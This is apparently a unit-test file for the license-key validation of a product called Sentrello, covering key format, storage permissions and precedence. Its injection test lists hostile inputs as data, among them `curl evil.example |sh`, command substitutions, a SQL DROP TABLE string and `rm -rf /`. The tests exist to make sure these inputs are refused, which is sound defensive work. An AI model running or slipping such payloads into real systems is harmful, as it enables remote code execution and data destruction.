import { beforeEach, expect, test } from "bun:test";
import { mkdtemp, readFile, stat, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  isValidLicenseKey,
  keyIsFromEnvironment,
  licenseKey,
  storeLicenseKey,
} from "./license-key";

let dir: string;

beforeEach(async () => {
  dir = await mkdtemp(join(tmpdir(), "sentrello-key-"));
  process.env.SENTRELLO_DATA_DIR = dir;
  process.env.SENTRELLO_LICENSE_KEY = "";
});

const REAL = "SENT-4QGE-M9EP-PRTX-ZGWY";

test("a real key is accepted", () => {
  expect(isValidLicenseKey(REAL)).toBe(true);
});

/**
 * The case that matters. This value reaches a shell — `sentrello update`
 * interpolates it into a curl argument — so anything that escapes the pattern
 * is a command running as root on a customer's own machine. Before it could be
 * typed into a web form it came from a file an operator wrote by hand.
 */
test("anything that could reach a shell is refused", () => {
  for (const evil of [
    'SENT-AAAA-BBBB-CCCC-DDDD"; curl evil.example |sh; #',
    "SENT-AAAA-BBBB-CCCC-DDDD`id`",
    "SENT-AAAA-BBBB-CCCC-$(id)",
    "SENT-AAAA-BBBB-CCCC-DDDD\nSENT-EEEE-FFFF-GGGG-HHHH",
    "SENT-AAAA-BBBB-CCCC-DDDD ",
    "'; DROP TABLE licenses; --",
    "",
  ]) {
    expect(isValidLicenseKey(evil)).toBe(false);
  }
});

test("characters we never issue are refused", () => {
  // 0/O and 1/I are excluded from the alphabet precisely because they get
  // misread; a key containing them was never issued by us.
  expect(isValidLicenseKey("SENT-0000-1111-OOOO-IIII")).toBe(false);
  expect(isValidLicenseKey("SENT-AAAA-BBBB-CCCC")).toBe(false);
  expect(isValidLicenseKey("sent-4qge-m9ep-prtx-zgwy")).toBe(false);
});

test("a key stored from the app is read back", async () => {
  await storeLicenseKey(REAL);
  expect(await licenseKey()).toBe(REAL);
});

test("it is stored where only the owner can read it", async () => {
  await storeLicenseKey(REAL);
  const mode = (await stat(join(dir, "license_key"))).mode & 0o777;
  expect(mode).toBe(0o600);
});

test("a key typed in lower case is still the right key", async () => {
  // Read off an email, retyped by a person. Rejecting it for case would be a
  // support ticket about something that is not wrong.
  await storeLicenseKey("sent-4qge-m9ep-prtx-zgwy");
  expect(await licenseKey()).toBe(REAL);
});

test("storing something that is not a key throws rather than writing it", async () => {
  await expect(storeLicenseKey("nonsense")).rejects.toThrow();
  expect(await licenseKey()).toBeNull();
});

/**
 * A key placed on the server deliberately must not be overridden by one typed
 * into a browser — the server is the more privileged of the two.
 */
test("the environment wins over the file", async () => {
  await storeLicenseKey(REAL);
  process.env.SENTRELLO_LICENSE_KEY = "SENT-AAAA-BBBB-CCCC-DDDD";
  expect(await licenseKey()).toBe("SENT-AAAA-BBBB-CCCC-DDDD");
  expect(keyIsFromEnvironment()).toBe(true);
});

test("a file edited into nonsense reads as Free, not as itself", async () => {
  // Free is a safe place to land. A mangled string reaching a command line is
  // not, so it is treated as absent rather than passed along.
  await writeFile(join(dir, "license_key"), "SENT-nope; rm -rf /\n");
  expect(await licenseKey()).toBeNull();
});

test("no key at all is Free, not an error", async () => {
  expect(await licenseKey()).toBeNull();
  expect(keyIsFromEnvironment()).toBe(false);
});

test("the stored file holds only the key", async () => {
  await storeLicenseKey(REAL);
  expect((await readFile(join(dir, "license_key"), "utf8")).trim()).toBe(REAL);
});
